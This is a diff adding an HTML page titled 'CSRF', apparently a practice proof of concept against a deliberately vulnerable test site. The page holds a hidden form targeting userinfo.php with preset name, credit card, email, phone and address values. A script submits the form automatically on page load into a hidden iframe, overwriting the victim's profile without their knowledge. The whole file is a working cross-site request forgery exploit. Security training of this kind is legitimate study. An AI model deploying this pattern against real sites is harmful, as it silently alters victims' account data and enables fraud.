@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF</title>
+</head>
+<body>
+    <h1>Profile data has been changed by CSRF attack</h1>
+
+<form hidden target="transFrame" name="form1" method="post" action="http://testphp.vulnweb.com/userinfo.php" >
+  <input type="hidden" name="update" value="update">
+
+  <table>
+    <tbody>
+      <tr>
+        <td valign="top">Name:</td>
+        <td><input type="text" value="John" name="urname" style="width:200px"></td>
+      </tr>
+      <tr>
+        <td valign="top">Credit card number:</td>
+        <td><input type="text" value="9001-2003-6541-1620" name="ucc" style="width:200px"></td>
+      </tr>
+      <tr>
+        <td valign="top">E-Mail:</td>
+        <td><input type="text" value="bekahs@email.com" name="uemail" style="width:200px"></td>
+      </tr>
+      <tr>
+        <td valign="top">Phone number:</td>
+        <td><input type="text" value="9097864539" name="uphone" style="width:200px"></td>
+      </tr>
+      <tr>
+        <td valign="top">Address:</td>
+        <td><textarea wrap="soft" name="uaddress" rows="5" style="width:200px">Preks street</textarea></td>
+      </tr>
+      <tr>
+        <td colspan="2" align="right"><input type="submit" value="update" name="update"></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <script>
+    document.body.onload = function() {
+      document.forms[0].submit();
+    };
+  </script>
+</form>
+
+<iframe hidden style="" name="transFrame" id="transFrame"></iframe>
+</body>
+</html>
